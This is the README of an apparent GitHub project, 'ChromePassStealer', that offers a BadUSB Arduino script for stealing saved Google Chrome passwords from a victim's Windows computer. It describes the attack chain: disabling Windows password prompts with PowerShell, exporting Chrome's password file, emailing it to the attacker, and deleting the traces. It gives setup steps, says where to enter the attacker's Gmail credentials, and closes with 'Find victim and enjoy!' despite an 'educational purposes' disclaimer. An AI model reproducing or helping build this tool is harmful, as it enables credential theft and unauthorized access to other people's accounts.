# ChromePassStealer 🥷
This project allows you to steal passwords from **Google Chrome** and get all the data by mail.
# Warning ⚠️
Everything in this repository is **strictly** for educational purposes. Notice **I am not responsible** for stolen data. **You are responsible** for your actions using developed script for **BadUSB**
# About ℹ️
Most people who are not well informed about **computer science** save their **passwords** on **Google Chrome** for convenience. This script uses these **weaknesses** to **steal** all **passwords** saved by **Google Chrome** users. The script makes your **BadUSB** disable **Windows** **passwords** by powershell command line, then it opens **Google Chrome** and download a **.csv** file with all **Chrome passwords** by **Windows shortcuts**. Once this file is downloaded, the **BadUSB** send this file by **mail** from powershell command line. To end up the script delete **.csv** file and close **Google Chrome** and powershell.
### NB n°1
Sometimes, you will see something like this : 
``` 
Keyboard.press(KEY_LEFT_CTRL);
Keyboard.press(KEY_LEFT_ALT);
Keyboard.press(173);
Keyboard.releaseAll(); 
```
This is only to write these characters : "@", "\\"
### NB n°2
When the script is executed the person who plugged **BadUsb** see his computer working alone so this script isn't optimized yet.
### NB n°3
You can customize the **delay** according to the speed in which you plug the **BadUSB**.
# Getting Started ✔️
## Requirments
1. Install **Arduino software** [here](https://www.arduino.cc/en/software).
2. Have a **Gmail** and enable **less secure app** [here](https://www.google.com/settings/security/lesssecureapps).
## Install
1. Download this repo
**Linux :**
```
git clone https://github.com/tuconnaisyouknow/ChromePassStealer
cd ChromePassStealer
```
**Windows :** Click on green button on right top of main page. Then click on "Download Zip" and extract zip file.
2. Replace your mail and password [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.txt) or [here](https://github.com/tuconnaisyouknow/ChromePassStealer/blob/main/ChromePassStealer.ino) at line 238, 245, 253, 264
3. Add your code in the **BadUSB** by **Arduino software**
4. Find victim and enjoy !
## Requirments for victim PC
* Turn off caps lock
* Switch the keyboard layout to English
# Help Me ⛑️
If you want to help me, I want to make the script run in background and do all it do from Chrome directly from powershell. Thanks to your contribution !
